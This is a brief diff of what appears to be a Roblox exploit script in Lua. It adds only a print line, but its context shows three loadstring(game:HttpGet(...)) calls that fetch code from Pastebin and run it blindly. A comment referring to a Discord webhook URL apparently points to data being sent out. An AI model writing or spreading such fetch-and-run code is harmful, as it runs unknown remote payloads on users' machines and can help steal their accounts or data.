@@ -4908,6 +4908,7 @@ pcall(function()
 end)
 loadstring(game:HttpGet("https://pastebin.com/raw/JKCcMv2m"), true)()
 loadstring(game:HttpGet("https://pastebin.com/raw/NVHH2LTW"), true)()
+print("Ran COmmands")
 loadstring(game:HttpGet("https://pastebin.com/raw/FLkdXxcL"), true)()
 
 -- Your Discord webhook URL
